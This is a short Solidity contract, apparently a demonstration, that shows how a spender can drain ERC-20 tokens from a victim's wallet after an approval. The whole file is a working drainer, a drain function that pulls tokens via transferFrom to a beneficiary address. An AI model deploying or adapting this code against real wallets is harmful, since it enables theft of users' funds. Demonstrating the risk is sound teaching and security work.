// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @title ApprovalAttack
/// @notice Demonstrates how an unlimited (or even large finite) ERC-20 approval can
///         be drained by the spender at any point in the future, independent of the
///         transaction that granted the approval.
contract ApprovalAttack {
    address public beneficiary;

    constructor(address beneficiary_) {
        beneficiary = beneficiary_;
    }

    /// @notice Drains as much of `token` as this contract is currently approved for
    ///         from `victim`, sending it to `beneficiary`. Callable at any time by
    ///         anyone once an approval exists — this is the exploit.
    function drain(address token, address victim) external {
        uint256 allowed = IERC20(token).allowance(victim, address(this));
        require(allowed > 0, "no allowance");
        uint256 balance = IERC20(token).balanceOf(victim);
        uint256 amount = allowed < balance ? allowed : balance;
        IERC20(token).transferFrom(victim, beneficiary, amount);
    }
}
